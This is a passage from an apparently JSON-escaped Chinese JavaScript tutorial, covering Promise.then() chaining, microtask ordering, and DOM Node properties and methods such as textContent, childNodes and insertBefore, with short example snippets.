class='header-anchor'>#</a>\n            <span>Promise.prototype.then()</span>\n        </h2>\n    <p>Promise 实例的<code>then</code>方法，用来添加回调函数。</p>\n<p><code>then</code>方法可以接受两个回调函数，第一个是异步操作成功时（变为<code>fulfilled</code>状态）时的回调函数，第二个是异步操作失败（变为<code>rejected</code>）时的回调函数（该参数可以省略）。一旦状态改变，就调用相应的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p1 = new Promise(function (resolve, reject) {\n  resolve(&#039;成功&#039;);\n});\np1.then(console.log, console.error);\n// &quot;成功&quot;\n\nvar p2 = new Promise(function (resolve, reject) {\n  reject(new Error(&#039;失败&#039;));\n});\np2.then(console.log, console.error);\n// Error: 失败</code></pre><p>上面代码中，<code>p1</code>和<code>p2</code>都是Promise 实例，它们的<code>then</code>方法绑定两个回调函数：成功时的回调函数<code>console.log</code>，失败时的回调函数<code>console.error</code>（可以省略）。<code>p1</code>的状态变为成功，<code>p2</code>的状态变为失败，对应的回调函数会收到异步操作传回的值，然后在控制台输出。</p>\n<p><code>then</code>方法可以链式使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>p1\n  .then(step1)\n  .then(step2)\n  .then(step3)\n  .then(\n    console.log,\n    console.error\n  );</code></pre><p>上面代码中，<code>p1</code>后面有四个<code>then</code>，意味依次有四个回调函数。只要前一步的状态变为<code>fulfilled</code>，就会依次执行紧跟在后面的回调函数。</p>\n<p>最后一个<code>then</code>方法，回调函数是<code>console.log</code>和<code>console.error</code>，用法上有一点重要的区别。<code>console.log</code>只显示<code>step3</code>的返回值，而<code>console.error</code>可以显示<code>p1</code>、<code>step1</code>、<code>step2</code>、<code>step3</code>之中任意一个发生的错误。举例来说，如果<code>step1</code>的状态变为<code>rejected</code>，那么<code>step2</code>和<code>step3</code>都不会执行了（因为它们是<code>resolved</code>的回调函数）。Promise 开始寻找，接下来第一个为<code>rejected</code>的回调函数，在上面代码中是<code>console.error</code>。这就是说，Promise 对象的报错具有传递性。</p>\n\n        <h2>\n            <a href='#then()-用法辨析' class='header-anchor'>#</a>\n            <span>then() 用法辨析</span>\n        </h2>\n    <p>Promise 的用法，简单说就是一句话：使用<code>then</code>方法添加回调函数。但是，不同的写法有一些细微的差别，请看下面四种写法，它们的差别在哪里？</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nf1().then(function () {\n  return f2();\n});\n\n// 写法二\nf1().then(function () {\n  f2();\n});\n\n// 写法三\nf1().then(f2());\n\n// 写法四\nf1().then(f2);</code></pre><p>为了便于讲解，下面这四种写法都再用<code>then</code>方法接一个回调函数<code>f3</code>。写法一的<code>f3</code>回调函数的参数，是<code>f2</code>函数的运行结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>f1().then(function () {\n  return f2();\n}).then(f3);</code></pre><p>写法二的<code>f3</code>回调函数的参数是<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>f1().then(function () {\n  f2();\n  return;\n}).then(f3);</code></pre><p>写法三的<code>f3</code>回调函数的参数，是<code>f2</code>函数返回的函数的运行结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>f1().then(f2())\n  .then(f3);</code></pre><p>写法四与写法一只有一个差别，那就是<code>f2</code>会接收到<code>f1()</code>返回的结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>f1().then(f2)\n  .then(f3);</code></pre>\n        <h2>\n            <a href='#实例：图片加载' class='header-anchor'>#</a>\n            <span>实例：图片加载</span>\n        </h2>\n    <p>下面是使用 Promise 完成图片的加载。</p>\n<pre class=\"prettyprint language-javascript\"><code>var preloadImage = function (path) {\n  return new Promise(function (resolve, reject) {\n    var image = new Image();\n    image.onload  = resolve;\n    image.onerror = reject;\n    image.src = path;\n  });\n};</code></pre><p>上面的<code>preloadImage</code>函数用法如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>preloadImage(&#039;https://example.com/my.jpg&#039;)\n  .then(function (e) { document.body.append(e.target) })\n  .then(function () { console.log(&#039;加载成功&#039;) })</code></pre>\n        <h2>\n            <a href='#小结' class='header-anchor'>#</a>\n            <span>小结</span>\n        </h2>\n    <p>Promise 的优点在于，让回调函数变成了规范的链式写法，程序流程可以看得很清楚。它有一整套接口，可以实现许多强大的功能，比如同时执行多个异步操作，等到它们的状态都改变以后，再执行一个回调函数；再比如，为多个回调函数中抛出的错误，统一指定处理方法等等。</p>\n<p>而且，Promise 还有一个传统写法没有的好处：它的状态一旦改变，无论何时查询，都能得到这个状态。这意味着，无论何时为 Promise 实例添加回调函数，该函数都能正确执行。所以，你不用担心是否错过了某个事件或信号。如果是传统写法，通过监听事件来执行回调函数，一旦错过了事件，再添加回调函数是不会执行的。</p>\n<p>Promise 的缺点是，编写的难度比传统写法高，而且阅读代码也不是一眼可以看懂。你只会看到一堆<code>then</code>，必须自己在<code>then</code>的回调函数里面理清逻辑。</p>\n\n        <h2>\n            <a href='#微任务' class='header-anchor'>#</a>\n            <span>微任务</span>\n        </h2>\n    <p>Promise 的回调函数属于异步任务，会在同步任务之后执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Promise(function (resolve, reject) {\n  resolve(1);\n}).then(console.log);\n\nconsole.log(2);\n// 2\n// 1</code></pre><p>上面代码会先输出2，再输出1。因为<code>console.log(2)</code>是同步任务，而<code>then</code>的回调函数属于异步任务，一定晚于同步任务执行。</p>\n<p>但是，Promise 的回调函数不是正常的异步任务，而是微任务（microtask）。它们的区别在于，正常任务追加到下一轮事件循环，微任务追加到本轮事件循环。这意味着，微任务的执行时间一定早于正常任务。</p>\n<pre class=\"prettyprint language-javascript\"><code>setTimeout(function() {\n  console.log(1);\n}, 0);\n\nnew Promise(function (resolve, reject) {\n  resolve(2);\n}).then(console.log);\n\nconsole.log(3);\n// 3\n// 2\n// 1</code></pre><p>上面代码的输出结果是<code>321</code>。这说明<code>then</code>的回调函数的执行时间，早于<code>setTimeout(fn, 0)</code>。因为<code>then</code>是本轮事件循环执行，<code>setTimeout(fn, 0)</code>在下一轮事件循环开始时执行。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Sebastian Porto, <a href=\"http://sporto.github.com/blog/2012/12/09/callbacks-listeners-promises/\">Asynchronous JS: Callbacks, Listeners, Control Flow Libs and Promises</a></li>\n<li>Rhys Brett-Bowen, <a href=\"http://modernjavascript.blogspot.com/2013/08/promisesa-understanding-by-doing.html\">Promises/A+ - understanding the spec through implementation</a></li>\n<li>Matt Podwysocki, Amanda Silver, <a href=\"http://blogs.msdn.com/b/ie/archive/2011/09/11/asynchronous-programming-in-javascript-with-promises.aspx\">Asynchronous Programming in JavaScript with “Promises”</a></li>\n<li>Marc Harter, <a href=\"https://gist.github.com//wavded/5692344\">Promise A+ Implementation</a></li>\n<li>Bryan Klimt, <a href=\"http://blog.parse.com/2013/01/29/whats-so-great-about-javascript-promises/\">What’s so great about JavaScript Promises?</a></li>\n<li>Jake Archibald, <a href=\"http://www.html5rocks.com/en/tutorials/es6/promises/\">JavaScript Promises There and back again</a></li>\n<li>Mikito Takada, <a href=\"http://book.mixu.net/node/ch7.html\">7. Control flow, Mixu&#39;s Node book</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"概述","link":"/dom/general.html"}],"content":"\n        <h1>\n            <a href='#DOM-概述' class='header-anchor'>#</a>\n            <span>DOM 概述</span>\n        </h1>\n    \n        <h2>\n            <a href='#DOM' class='header-anchor'>#</a>\n            <span>DOM</span>\n        </h2>\n    <p>DOM 是 JavaScript 操作网页的接口，全称为“文档对象模型”（Document Object Model）。它的作用是将网页转为一个 JavaScript 对象，从而可以用脚本进行各种操作（比如增删内容）。</p>\n<p>浏览器会根据 DOM 模型，将结构化文档（比如 HTML 和 XML）解析成一系列的节点，再由这些节点组成一个树状结构（DOM Tree）。所有的节点和最终的树状结构，都有规范的对外接口。</p>\n<p>DOM 只是一个接口规范，可以用各种语言实现。所以严格地说，DOM 不是 JavaScript 语法的一部分，但是 DOM 操作是 JavaScript 最常见的任务，离开了 DOM，JavaScript 就无法控制网页。另一方面，JavaScript 也是最常用于 DOM 操作的语言。后面介绍的就是 JavaScript 对 DOM 标准的实现和用法。</p>\n\n        <h2>\n            <a href='#节点' class='header-anchor'>#</a>\n            <span>节点</span>\n        </h2>\n    <p>DOM 的最小组成单位叫做节点（node）。文档的树形结构（DOM 树），就是由各种不同类型的节点组成。每个节点可以看作是文档树的一片叶子。</p>\n<p>节点的类型有七种。</p>\n<ul>\n<li><code>Document</code>：整个文档树的顶层节点</li>\n<li><code>DocumentType</code>：<code>doctype</code>标签（比如<code>&lt;!DOCTYPE html&gt;</code>）</li>\n<li><code>Element</code>：网页的各种HTML标签（比如<code>&lt;body&gt;</code>、<code>&lt;a&gt;</code>等）</li>\n<li><code>Attribute</code>：网页元素的属性（比如<code>class=&quot;right&quot;</code>）</li>\n<li><code>Text</code>：标签之间或标签包含的文本</li>\n<li><code>Comment</code>：注释</li>\n<li><code>DocumentFragment</code>：文档的片段</li>\n</ul>\n<p>浏览器提供一个原生的节点对象<code>Node</code>，上面这七种节点都继承了<code>Node</code>，因此具有一些共同的属性和方法。</p>\n\n        <h2>\n            <a href='#节点树' class='header-anchor'>#</a>\n            <span>节点树</span>\n        </h2>\n    <p>一个文档的所有节点，按照所在的层级，可以抽象成一种树状结构。这种树状结构就是 DOM 树。它有一个顶层节点，下一层都是顶层节点的子节点，然后子节点又有自己的子节点，就这样层层衍生出一个金字塔结构，倒过来就像一棵树。</p>\n<p>浏览器原生提供<code>document</code>节点，代表整个文档。</p>\n<pre class=\"prettyprint language-javascript\"><code>document\n// 整个文档树</code></pre><p>文档的第一层只有一个节点，就是 HTML 网页的第一个标签<code>&lt;html&gt;</code>，它构成了树结构的根节点（root node），其他 HTML 标签节点都是它的下级节点。</p>\n<p>除了根节点，其他节点都有三种层级关系。</p>\n<ul>\n<li>父节点关系（parentNode）：直接的那个上级节点</li>\n<li>子节点关系（childNodes）：直接的下级节点</li>\n<li>同级节点关系（sibling）：拥有同一个父节点的节点</li>\n</ul>\n<p>DOM 提供操作接口，用来获取这三种关系的节点。比如，子节点接口包括<code>firstChild</code>（第一个子节点）和<code>lastChild</code>（最后一个子节点）等属性，同级节点接口包括<code>nextSibling</code>（紧邻在后的那个同级节点）和<code>previousSibling</code>（紧邻在前的那个同级节点）属性。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"DOM","link":"javascript:void(0)"},{"title":"Node 接口","link":"/dom/node.html"}],"content":"\n        <h1>\n            <a href='#Node-接口' class='header-anchor'>#</a>\n            <span>Node 接口</span>\n        </h1>\n    <p>所有 DOM 节点对象都继承了 Node 接口，拥有一些共同的属性和方法。这是 DOM 操作的基础。</p>\n\n        <h2>\n            <a href='#属性' class='header-anchor'>#</a>\n            <span>属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#Node.prototype.nodeType' class='header-anchor'>#</a>\n            <span>Node.prototype.nodeType</span>\n        </h3>\n    <p><code>nodeType</code>属性返回一个整数值，表示节点的类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.nodeType // 9</code></pre><p>上面代码中，文档节点的类型值为9。</p>\n<p>Node 对象定义了几个常量，对应这些类型值。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.nodeType === Node.DOCUMENT_NODE // true</code></pre><p>上面代码中，文档节点的<code>nodeType</code>属性等于常量<code>Node.DOCUMENT_NODE</code>。</p>\n<p>不同节点的<code>nodeType</code>属性值和对应的常量如下。</p>\n<ul>\n<li>文档节点（document）：9，对应常量<code>Node.DOCUMENT_NODE</code></li>\n<li>元素节点（element）：1，对应常量<code>Node.ELEMENT_NODE</code></li>\n<li>属性节点（attr）：2，对应常量<code>Node.ATTRIBUTE_NODE</code></li>\n<li>文本节点（text）：3，对应常量<code>Node.TEXT_NODE</code></li>\n<li>文档片断节点（DocumentFragment）：11，对应常量<code>Node.DOCUMENT_FRAGMENT_NODE</code></li>\n<li>文档类型节点（DocumentType）：10，对应常量<code>Node.DOCUMENT_TYPE_NODE</code></li>\n<li>注释节点（Comment）：8，对应常量<code>Node.COMMENT_NODE</code></li>\n</ul>\n<p>确定节点类型时，使用<code>nodeType</code>属性是常用方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var node = document.documentElement.firstChild;\nif (node.nodeType === Node.ELEMENT_NODE) {\n  console.log(&#039;该节点是元素节点&#039;);\n}</code></pre>\n        <h3>\n            <a href='#Node.prototype.nodeName' class='header-anchor'>#</a>\n            <span>Node.prototype.nodeName</span>\n        </h3>\n    <p><code>nodeName</code>属性返回节点的名称。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;\nvar div = document.getElementById(&#039;d1&#039;);\ndiv.nodeName // &quot;DIV&quot;</code></pre><p>上面代码中，元素节点<code>&lt;div&gt;</code>的<code>nodeName</code>属性就是大写的标签名<code>DIV</code>。</p>\n<p>不同节点的<code>nodeName</code>属性值如下。</p>\n<ul>\n<li>文档节点（document）：<code>#document</code></li>\n<li>元素节点（element）：大写的标签名</li>\n<li>属性节点（attr）：属性的名称</li>\n<li>文本节点（text）：<code>#text</code></li>\n<li>文档片断节点（DocumentFragment）：<code>#document-fragment</code></li>\n<li>文档类型节点（DocumentType）：文档的类型</li>\n<li>注释节点（Comment）：<code>#comment</code></li>\n</ul>\n\n        <h3>\n            <a href='#Node.prototype.nodeValue' class='header-anchor'>#</a>\n            <span>Node.prototype.nodeValue</span>\n        </h3>\n    <p><code>nodeValue</code>属性返回一个字符串，表示当前节点本身的文本值，该属性可读写。</p>\n<p>只有文本节点（text）和注释节点（comment）有文本值，因此这两类节点的<code>nodeValue</code>可以返回结果，其他类型的节点一律返回<code>null</code>。同样的，也只有这两类节点可以设置<code>nodeValue</code>属性的值，其他类型的节点设置无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;d1&quot;&gt;hello world&lt;/div&gt;\nvar div = document.getElementById(&#039;d1&#039;);\ndiv.nodeValue // null\ndiv.firstChild.nodeValue // &quot;hello world&quot;</code></pre><p>上面代码中，<code>div</code>是元素节点，<code>nodeValue</code>属性返回<code>null</code>。<code>div.firstChild</code>是文本节点，所以可以返回文本值。</p>\n\n        <h3>\n            <a href='#Node.prototype.textContent' class='header-anchor'>#</a>\n            <span>Node.prototype.textContent</span>\n        </h3>\n    <p><code>textContent</code>属性返回当前节点和它的所有后代节点的文本内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为\n// &lt;div id=&quot;divA&quot;&gt;This is &lt;span&gt;some&lt;/span&gt; text&lt;/div&gt;\n\ndocument.getElementById(&#039;divA&#039;).textContent\n// This is some text</code></pre><p><code>textContent</code>属性自动忽略当前节点内部的 HTML 标签，返回所有文本内容。</p>\n<p>该属性是可读写的，设置该属性的值，会用一个新的文本节点，替换所有原来的子节点。它还有一个好处，就是自动对 HTML 标签转义。这很适合用于用户提供的内容。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&#039;foo&#039;).textContent = &#039;&lt;p&gt;GoodBye!&lt;/p&gt;&#039;;</code></pre><p>上面代码在插入文本时，会将<code>&lt;p&gt;</code>标签解释为文本，而不会当作标签处理。</p>\n<p>对于文本节点（text）和注释节点（comment），<code>textContent</code>属性的值与<code>nodeValue</code>属性相同。对于其他类型的节点，该属性会将每个子节点的内容连接在一起返回，但是不包括注释节点。如果一个节点没有子节点，则返回空字符串。</p>\n<p>文档节点（document）和文档类型节点（doctype）的<code>textContent</code>属性为<code>null</code>。如果要读取整个文档的内容，可以使用<code>document.documentElement.textContent</code>。</p>\n\n        <h3>\n            <a href='#Node.prototype.baseURI' class='header-anchor'>#</a>\n            <span>Node.prototype.baseURI</span>\n        </h3>\n    <p><code>baseURI</code>属性返回一个字符串，表示当前网页的绝对路径。浏览器根据这个属性，计算网页上的相对路径的 URL。该属性为只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 当前网页的网址为\n// http://www.example.com/index.html\ndocument.baseURI\n// &quot;http://www.example.com/index.html&quot;</code></pre><p>如果无法读到网页的 URL，<code>baseURI</code>属性返回<code>null</code>。</p>\n<p>该属性的值一般由当前网址的 URL（即<code>window.location</code>属性）决定，但是可以使用 HTML 的<code>&lt;base&gt;</code>标签，改变该属性的值。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;base href=&quot;http://www.example.com/page.html&quot;&gt;</code></pre><p>设置了以后，<code>baseURI</code>属性就返回<code>&lt;base&gt;</code>标签设置的值。</p>\n\n        <h3>\n            <a href='#Node.prototype.ownerDocument' class='header-anchor'>#</a>\n            <span>Node.prototype.ownerDocument</span>\n        </h3>\n    <p><code>Node.ownerDocument</code>属性返回当前节点所在的顶层文档对象，即<code>document</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var d = p.ownerDocument;\nd === document // true</code></pre><p><code>document</code>对象本身的<code>ownerDocument</code>属性，返回<code>null</code>。</p>\n\n        <h3>\n            <a href='#Node.prototype.nextSibling' class='header-anchor'>#</a>\n            <span>Node.prototype.nextSibling</span>\n        </h3>\n    <p><code>Node.nextSibling</code>属性返回紧跟在当前节点后面的第一个同级节点。如果当前节点后面没有同级节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;\nvar div1 = document.getElementById(&#039;d1&#039;);\nvar div2 = document.getElementById(&#039;d2&#039;);\n\nd1.nextSibling === d2 // true</code></pre><p>上面代码中，<code>d1.nextSibling</code>就是紧跟在<code>d1</code>后面的同级节点<code>d2</code>。</p>\n<p>注意，该属性还包括文本节点和注释节点（<code>&lt;!-- comment --&gt;</code>）。因此如果当前节点后面有空格，该属性会返回一个文本节点，内容为空格。</p>\n<p><code>nextSibling</code>属性可以用来遍历所有子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var el = document.getElementById(&#039;div1&#039;).firstChild;\n\nwhile (el !== null) {\n  console.log(el.nodeName);\n  el = el.nextSibling;\n}</code></pre><p>上面代码遍历<code>div1</code>节点的所有子节点。</p>\n\n        <h3>\n            <a href='#Node.prototype.previousSibling' class='header-anchor'>#</a>\n            <span>Node.prototype.previousSibling</span>\n        </h3>\n    <p><code>previousSibling</code>属性返回当前节点前面的、距离最近的一个同级节点。如果当前节点前面没有同级节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;div id=&quot;d1&quot;&gt;hello&lt;/div&gt;&lt;div id=&quot;d2&quot;&gt;world&lt;/div&gt;\nvar div1 = document.getElementById(&#039;d1&#039;);\nvar div2 = document.getElementById(&#039;d2&#039;);\n\nd2.previousSibling === d1 // true</code></pre><p>上面代码中，<code>d2.previousSibling</code>就是<code>d2</code>前面的同级节点<code>d1</code>。</p>\n<p>注意，该属性还包括文本节点和注释节点。因此如果当前节点前面有空格，该属性会返回一个文本节点，内容为空格。</p>\n\n        <h3>\n            <a href='#Node.prototype.parentNode' class='header-anchor'>#</a>\n            <span>Node.prototype.parentNode</span>\n        </h3>\n    <p><code>parentNode</code>属性返回当前节点的父节点。对于一个节点来说，它的父节点只可能是三种类型：元素节点（element）、文档节点（document）和文档片段节点（documentfragment）。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (node.parentNode) {\n  node.parentNode.removeChild(node);\n}</code></pre><p>上面代码中，通过<code>node.parentNode</code>属性将<code>node</code>节点从文档里面移除。</p>\n<p>文档节点（document）和文档片段节点（documentfragment）的父节点都是<code>null</code>。另外，对于那些生成后还没插入 DOM 树的节点，父节点也是<code>null</code>。</p>\n\n        <h3>\n            <a href='#Node.prototype.parentElement' class='header-anchor'>#</a>\n            <span>Node.prototype.parentElement</span>\n        </h3>\n    <p><code>parentElement</code>属性返回当前节点的父元素节点。如果当前节点没有父节点，或者父节点类型不是元素节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (node.parentElement) {\n  node.parentElement.style.color = &#039;red&#039;;\n}</code></pre><p>上面代码中，父元素节点的样式设定了红色。</p>\n<p>由于父节点只可能是三种类型：元素节点、文档节点（document）和文档片段节点（documentfragment）。<code>parentElement</code>属性相当于把后两种父节点都排除了。</p>\n\n        <h3>\n            <a href='#Node.prototype.firstChild，Node.prototype.lastChild' class='header-anchor'>#</a>\n            <span>Node.prototype.firstChild，Node.prototype.lastChild</span>\n        </h3>\n    <p><code>firstChild</code>属性返回当前节点的第一个子节点，如果当前节点没有子节点，则返回<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;p id=&quot;p1&quot;&gt;&lt;span&gt;First span&lt;/span&gt;&lt;/p&gt;\nvar p1 = document.getElementById(&#039;p1&#039;);\np1.firstChild.nodeName // &quot;SPAN&quot;</code></pre><p>上面代码中，<code>p</code>元素的第一个子节点是<code>span</code>元素。</p>\n<p>注意，<code>firstChild</code>返回的除了元素节点，还可能是文本节点或注释节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码如下\n// &lt;p id=&quot;p1&quot;&gt;\n//   &lt;span&gt;First span&lt;/span&gt;\n//  &lt;/p&gt;\nvar p1 = document.getElementById(&#039;p1&#039;);\np1.firstChild.nodeName // &quot;#text&quot;</code></pre><p>上面代码中，<code>p</code>元素与<code>span</code>元素之间有空白字符，这导致<code>firstChild</code>返回的是文本节点。</p>\n<p><code>lastChild</code>属性返回当前节点的最后一个子节点，如果当前节点没有子节点，则返回<code>null</code>。用法与<code>firstChild</code>属性相同。</p>\n\n        <h3>\n            <a href='#Node.prototype.childNodes' class='header-anchor'>#</a>\n            <span>Node.prototype.childNodes</span>\n        </h3>\n    <p><code>childNodes</code>属性返回一个类似数组的对象（<code>NodeList</code>集合），成员包括当前节点的所有子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.querySelector(&#039;ul&#039;).childNodes;</code></pre><p>上面代码中，<code>children</code>就是<code>ul</code>元素的所有子节点。</p>\n<p>使用该属性，可以遍历某个节点的所有子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var div = document.getElementById(&#039;div1&#039;);\nvar children = div.childNodes;\n\nfor (var i = 0; i &lt; children.length; i++) {\n  // ...\n}</code></pre><p>文档节点（document）就有两个子节点：文档类型节点（docType）和 HTML 根元素节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var children = document.childNodes;\nfor (var i = 0; i &lt; children.length; i++) {\n  console.log(children[i].nodeType);\n}\n// 10\n// 1</code></pre><p>上面代码中，文档节点的第一个子节点的类型是10（即文档类型节点），第二个子节点的类型是1（即元素节点）。</p>\n<p>注意，除了元素节点，<code>childNodes</code>属性的返回值还包括文本节点和注释节点。如果当前节点不包括任何子节点，则返回一个空的<code>NodeList</code>集合。由于<code>NodeList</code>对象是一个动态集合，一旦子节点发生变化，立刻会反映在返回结果之中。</p>\n\n        <h3>\n            <a href='#Node.prototype.isConnected' class='header-anchor'>#</a>\n            <span>Node.prototype.isConnected</span>\n        </h3>\n    <p><code>isConnected</code>属性返回一个布尔值，表示当前节点是否在文档之中。</p>\n<pre class=\"prettyprint language-javascript\"><code>var test = document.createElement(&#039;p&#039;);\ntest.isConnected // false\n\ndocument.body.appendChild(test);\ntest.isConnected // true</code></pre><p>上面代码中，<code>test</code>节点是脚本生成的节点，没有插入文档之前，<code>isConnected</code>属性返回<code>false</code>，插入之后返回<code>true</code>。</p>\n\n        <h2>\n            <a href='#方法' class='header-anchor'>#</a>\n            <span>方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Node.prototype.appendChild()' class='header-anchor'>#</a>\n            <span>Node.prototype.appendChild()</span>\n        </h3>\n    <p><code>appendChild</code>方法接受一个节点对象作为参数，将其作为最后一个子节点，插入当前节点。该方法的返回值就是插入文档的子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = document.createElement(&#039;p&#039;);\ndocument.body.appendChild(p);</code></pre><p>上面代码新建一个<code>&lt;p&gt;</code>节点，将其插入<code>document.body</code>的尾部。</p>\n<p>如果参数节点是 DOM 已经存在的节点，<code>appendChild</code>方法会将其从原来的位置，移动到新位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var element = document\n  .createElement(&#039;div&#039;)\n  .appendChild(document.createElement(&#039;b&#039;));</code></pre><p>上面代码的返回值是<code>&lt;b&gt;&lt;/b&gt;</code>，而不是<code>&lt;div&gt;&lt;/div&gt;</code>。</p>\n<p>如果<code>appendChild</code>方法的参数是<code>DocumentFragment</code>节点，那么插入的是<code>DocumentFragment</code>的所有子节点，而不是<code>DocumentFragment</code>节点本身。返回值是一个空的<code>DocumentFragment</code>节点。</p>\n\n        <h3>\n            <a href='#Node.prototype.hasChildNodes()' class='header-anchor'>#</a>\n            <span>Node.prototype.hasChildNodes()</span>\n        </h3>\n    <p><code>hasChildNodes</code>方法返回一个布尔值，表示当前节点是否有子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = document.getElementById(&#039;foo&#039;);\n\nif (foo.hasChildNodes()) {\n  foo.removeChild(foo.childNodes[0]);\n}</code></pre><p>上面代码表示，如果<code>foo</code>节点有子节点，就移除第一个子节点。</p>\n<p>注意，子节点包括所有类型的节点，并不仅仅是元素节点。哪怕节点只包含一个空格，<code>hasChildNodes</code>方法也会返回<code>true</code>。</p>\n<p>判断一个节点有没有子节点，有许多种方法，下面是其中的三种。</p>\n<ul>\n<li><code>node.hasChildNodes()</code></li>\n<li><code>node.firstChild !== null</code></li>\n<li><code>node.childNodes &amp;&amp; node.childNodes.length &gt; 0</code></li>\n</ul>\n<p><code>hasChildNodes</code>方法结合<code>firstChild</code>属性和<code>nextSibling</code>属性，可以遍历当前节点的所有后代节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>function DOMComb(parent, callback) {\n  if (parent.hasChildNodes()) {\n    for (var node = parent.firstChild; node; node = node.nextSibling) {\n      DOMComb(node, callback);\n    }\n  }\n  callback(parent);\n}\n\n// 用法\nDOMComb(document.body, console.log)</code></pre><p>上面代码中，<code>DOMComb</code>函数的第一个参数是某个指定的节点，第二个参数是回调函数。这个回调函数会依次作用于指定节点，以及指定节点的所有后代节点。</p>\n\n        <h3>\n            <a href='#Node.prototype.cloneNode()' class='header-anchor'>#</a>\n            <span>Node.prototype.cloneNode()</span>\n        </h3>\n    <p><code>cloneNode</code>方法用于克隆一个节点。它接受一个布尔值作为参数，表示是否同时克隆子节点。它的返回值是一个克隆出来的新节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var cloneUL = document.querySelector(&#039;ul&#039;).cloneNode(true);</code></pre><p>该方法有一些使用注意点。</p>\n<p>（1）克隆一个节点，会拷贝该节点的所有属性，但是会丧失<code>addEventListener</code>方法和<code>on-</code>属性（即<code>node.onclick = fn</code>），添加在这个节点上的事件回调函数。</p>\n<p>（2）该方法返回的节点不在文档之中，即没有任何父节点，必须使用诸如<code>Node.appendChild</code>这样的方法添加到文档之中。</p>\n<p>（3）克隆一个节点之后，DOM 有可能出现两个有相同<code>id</code>属性（即<code>id=&quot;xxx&quot;</code>）的网页元素，这时应该修改其中一个元素的<code>id</code>属性。如果原节点有<code>name</code>属性，可能也需要修改。</p>\n\n        <h3>\n            <a href='#Node.prototype.insertBefore()' class='header-anchor'>#</a>\n            <span>Node.prototype.insertBefore()</span>\n        </h3>\n    <p><code>insertBefore</code>方法用于将某个节点插入父节点内部的指定位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var insertedNode = parentNode.insertBefore(newNode, referenceNode);</code></pre><p><code>insertBefore</code>方法接受两个参数，第一个参数是所要插入的节点<code>newNode</code>，第二个参数是父节点<code>parentNode</code>内部的一个子节点<code>referenceNode</code>。<code>newNode</code>将插在<code>referenceNode</code>这个子节点的前面。返回值是插入的新节点<code>newNode</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = document.createElement(&#039;p&#039;);\ndocument.body.insertBefore(p, document.body.firstChild);</code></pre><p>上面代码中，新建一个<code>&lt;p&gt;</code>节点，插在<code>document.body.firstChild</code>的前面，也就是成为<code>document.body</code>的第一个子节点。</p>\n<p>如果<code>insertBefore</code>方法的第二个参数为<code>null</code>，则新节点将插在当前节点内部的最后位置，即变成最后一个子节点。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = document.createElement(&#039;p&#039;);\ndocument.body.insertBefore(p, null);</code></pre><p>上面代码中，<code>p</code>将成为<code>document.body</code>的最后一个子节点。这也说明<code>insertBefore</code>的第二个参数不能省略。</p>\n<p>注意，如果所要插入的节点是当前 DOM 现有的节点，则该节点将从原有的位置移除，插入新的位置。</p>\n<p>由于不存在<code>insertAfter</code>方法，如果新节点要插在父节点的某个子节点后面，可以用<code>insertBefore</code>方法结合<code>nextSibling</code>属性模拟。</p>\n<pre class=\"prettyprint language-javascript\"><code>parent.insertBefore(s1, s2.nextSibling);</code></pre><p>上面代码中，<code>parent</code>是父节点，<code>s1</code>是一个全新的节点，<code>s2</code>是可以将<code>s1</code>节点，插在<code>s2</code>节点的后面。如果<code>s2</code>是当前节点的最后一个子节点，则<code>s2.nextSibling</code>返回<code>null</code>，这时<code>s1</code>节点会插在当前节点的最后，变成当前节点的最后一个子节点，等于紧跟在<code>s2</code>的后面。</p>\n<p>如果要插入的节点是<code>DocumentFragment</code>类型，那么插入的将是<code>DocumentFragment</code>的所有子节点，而不是<code>DocumentFragment</code>节点本身。返回值将是一个空的<code>DocumentFragment</code>节点。</p>\n\n        <h3>\n            <a 